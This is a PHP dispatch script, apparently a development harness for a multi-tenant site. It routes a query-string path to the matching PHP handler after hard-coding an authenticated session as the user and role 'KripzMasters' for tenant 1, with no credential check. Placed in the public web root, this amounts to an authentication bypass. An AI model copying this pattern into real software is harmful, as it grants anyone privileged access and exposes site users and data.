<?php
$target = $_GET['target'] ?? '/control/domain-registrars/providers/netearthone/';
$target = (string)$target;
if (preg_match('%^(/[A-Za-z0-9._/-]+|/[A-Za-z0-9._/-]+index\.php)$%', $target) !== 1) {
    http_response_code(400); echo 'bad target'; exit;
}
$publicRoot = __DIR__;

// Resolve the real dispatch PHP file by walking up directories (same as Apache RewriteCond !-d !-f fallback).
$abs = $publicRoot . $target;
$dispatchScript = null;
$pathInfo = '';
$check = $abs;
$parentStack = [];
while (true) {
    if (is_file($check)) { $dispatchScript = $check; $pathInfo = substr($abs, strlen($check)); break; }
    if (is_dir($check)) {
        $idx = rtrim($check, '/\\') . '/index.php';
        if (is_file($idx)) { $dispatchScript = $idx; $pathInfo = ''; break; }
    }
    $parent = dirname($check);
    if ($parent === $check || $parent === '' || str_starts_with($publicRoot, $parent) === false || strlen($parent) < strlen($publicRoot)) {
        break;
    }
    $check = $parent;
}
if ($dispatchScript === null) {
    // Try fallback: public_html catch-all index.php files
    foreach (['/control/domain-registrars/index.php', '/hub/companies/domains/index.php', '/hub/domains/index.php', '/index.php'] as $fallback) {
        $fb = $publicRoot . $fallback;
        if (is_file($fb)) { $dispatchScript = $fb; break; }
    }
}
if ($dispatchScript === null || !is_file($dispatchScript)) {
    http_response_code(404); echo 'dispatch not found for target: '.$target; exit;
}
if (session_status() === PHP_SESSION_NONE) { session_start(); }
$_SESSION['mh_auth_user'] = 'KripzMasters';
$_SESSION['mh_groups'] = ['KripzMasters'];
$_SESSION['mh_auth_role'] = 'KripzMasters';
$_SESSION['mh_auth_tenant_id'] = 1;
$_SESSION['mh_auth_tenant_slug'] = 'metahumans';
if (session_id() !== '' && !headers_sent()) {
    $name = session_name();
    $sid = session_id();
    header('Set-Cookie: ' . $name . '=' . $sid . '; path=/; HttpOnly; SameSite=Lax', false);
}
chdir($publicRoot);
$_SERVER['REQUEST_URI'] = $target;
$_SERVER['PATH_INFO'] = $pathInfo !== '' ? $pathInfo : ($_SERVER['PATH_INFO'] ?? '');
$_SERVER['SCRIPT_NAME'] = substr($dispatchScript, strlen($publicRoot));
$_SERVER['PHP_SELF'] = $_SERVER['SCRIPT_NAME'] . ($pathInfo !== '' ? $pathInfo : '');
$_SERVER['SCRIPT_FILENAME'] = $dispatchScript;
require $dispatchScript;
